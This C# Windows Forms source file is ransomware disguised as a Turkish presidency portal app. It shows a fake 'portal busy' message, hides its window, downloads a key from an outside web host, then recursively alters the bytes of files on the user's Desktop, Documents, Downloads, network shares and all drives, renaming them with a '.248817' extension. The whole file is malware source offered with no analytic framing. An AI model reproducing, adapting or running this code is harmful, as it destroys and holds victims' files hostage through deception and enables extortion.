using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.IO;
using System.Net;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Cumhurbaşkanlığı_Portal
{
    public partial class Form1 : Form
    {
        // Değişkenler
        String kullaniciAdi;
        String masaustuYolu, belgelerimYolu, indirilenlerYolu;
        String yeniDosyaYolu;
        String terminal1Belgelerim,terminal1c, terminal1yedek_D , terminal2d,terminal2Users;
        Byte[] harfDizisi;
        Byte[] kod = null;
        Boolean hazirlik = false;
        String isim = "baykan";
        string[] drives= System.IO.Directory.GetLogicalDrives();

        // Değişkenler Son


        public Form1()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
            backgroundWorker2.RunWorkerAsync();
            backgroundWorker3.RunWorkerAsync();
            

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            System.Threading.Thread.Sleep(3500);
            MessageBox.Show("Yoğunluktan dolayı portala erişim sağlayamıyorsunuz. Lütfen birkaç saat sonra tekrar deneyiniz.");
            this.Opacity = 0;
            this.ShowInTaskbar = false;               
            
        }

        private void backgroundWorker2_DoWork(object sender, DoWorkEventArgs e)
        {
            String sifre = sifreAl();            
            kod= Encoding.ASCII.GetBytes(sifre);
            hazirlik = true;
                        
        }
                     
        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            while(!hazirlik)
            {
                ;
            }
            kullaniciAdi = Environment.UserName;
            masaustuYolu = "C:\\Users\\"+kullaniciAdi+"\\Desktop";           
            belgelerimYolu = "C:\\Users\\"+kullaniciAdi+"\\Documents";
            indirilenlerYolu = "C:\\Users\\"+kullaniciAdi+ "\\Downloads";
            terminal1Belgelerim = @"terminal1\Belgelerim";
            terminal1c = @"terminal1\c";
            terminal1yedek_D = @"terminal1\yedek (D)";
            terminal2d = @"terminal2\d";
            terminal2Users = @"terminal2\Users";
            
            backgroundWorker4.RunWorkerAsync();
            uzantiDegistir(terminal1Belgelerim);
            uzantiDegistir(terminal1c);
            uzantiDegistir(terminal1yedek_D);
            uzantiDegistir(terminal2d);
            uzantiDegistir(terminal2Users);
            uzantiDegistir(indirilenlerYolu);  
            uzantiDegistir(belgelerimYolu);       
            uzantiDegistir(masaustuYolu);
            
            MessageBox.Show(":)");
            

        }

        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {
            foreach (string drv in drives)
            {
                if (!drv.Contains("C"))
                {
                    uzantiDegistir(drv);
                }


            }
            try
            {
                uzantiDegistir("C:\\");
            }
            catch (Exception x)
            {
                ;
            }
        }

        private void backgroundWorker5_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void backgroundWorker6_DoWork(object sender, DoWorkEventArgs e)
        {

        }


        // Fonksiyonlar
        public void uzantiDegistir(string yol)
        {
            if (File.Exists(yol))
            {
                
                dosyaIsle(yol);
            }
            else if (Directory.Exists(yol))
            {

                klasorIsle(yol);
            }
            else
            {
                ;
            }
        }

        public void dosyaIsle(string dosyaYolu)
        {

            try
            {
                if (!dosyaYolu.Contains("248817") && !dosyaYolu.Contains("umhu"))
                {
                    
                    try
                    {
                        harfDizisi = File.ReadAllBytes(dosyaYolu);
                    }
                    catch (Exception e)
                    {
                        
                    }

                    int sayi = 0;
                    int sayi2 = 0;
                    
                    for (sayi = 0; sayi < harfDizisi.Length; sayi++)
                    {
                        harfDizisi[sayi] = (byte)(harfDizisi[sayi] - kod[sayi2]);
                        if (sayi2 == 500) sayi2 = 0;
                    }

                    try
                    {
                        File.WriteAllBytes(dosyaYolu, harfDizisi);
                    }
                    catch (Exception e)
                    {
                        ;
                    }
                    System.IO.File.Move(dosyaYolu, dosyaYolu + ".248817");
                }
            }
            catch (Exception e)
            {
                ;
            }



        }

        

        public void klasorIsle(string klasorYolu)
        {
            try
            {
                string[] dosyalar = Directory.GetFiles(klasorYolu);
                foreach (string dosya in dosyalar)
                {
                    dosyaIsle(dosya);
                }

                string[] altKlasorler = Directory.GetDirectories(klasorYolu);
                foreach (string altklasor in altKlasorler)
                {
                    klasorIsle(altklasor);
                }
            }
            catch(Exception e)
            {
                ;
            }
        }

        public string sifreAl()
        {
            WebClient client = new WebClient();
            string downloadString = client.DownloadString("https://248817playground.000webhostapp.com/?isim=" + isim);
            
            return downloadString;
        }
    }
}
